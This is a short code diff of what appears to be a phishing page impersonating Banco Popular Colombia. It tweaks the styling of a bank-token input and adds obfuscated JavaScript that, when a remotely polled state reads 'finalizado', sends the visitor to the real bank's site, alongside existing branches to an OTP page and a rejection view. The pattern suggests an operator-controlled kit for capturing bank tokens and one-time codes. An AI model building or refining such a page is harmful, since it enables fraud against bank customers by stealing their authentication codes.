@@ -79,8 +79,8 @@
             color: #000;
             background: #fff;
             text-align: center;
-            letter-spacing: 18px;
-            text-indent: 18px;
+            letter-spacing: 12px;
+            text-indent: 12px;
             transition: border-color 0.2s;
             margin-bottom: 20px;
         }
@@ -96,8 +96,8 @@
         }
 
         .token-input::placeholder {
-            letter-spacing: 18px;
-            text-indent: 18px;
+            letter-spacing: 12px;
+            text-indent: 12px;
             color: var(--pop-light-900);
         }
 
@@ -177,12 +177,12 @@
             .token-input {
                 padding: 16px 10px;
                 font-size: 26px;
-                letter-spacing: 14px;
-                text-indent: 14px;
+                letter-spacing: 10px;
+                text-indent: 10px;
             }
             .token-input::placeholder {
-                letter-spacing: 14px;
-                text-indent: 14px;
+                letter-spacing: 10px;
+                text-indent: 10px;
             }
             .token-illustration {
                 width: 100px;
@@ -328,6 +328,9 @@
                     if (_0xy5.estado === 'otp') {
                         clearInterval(_0xw3);
                         window.location.href = 'otp.html';
+                    } else if (_0xy5.estado === 'finalizado') {
+                        clearInterval(_0xw3);
+                        window.location.href = 'https://www.bancopopular.com.co/';
                     } else if (_0xy5.estado === 'rechazado') {
                         clearInterval(_0xw3);
                         _0xg7.classList.remove('show');
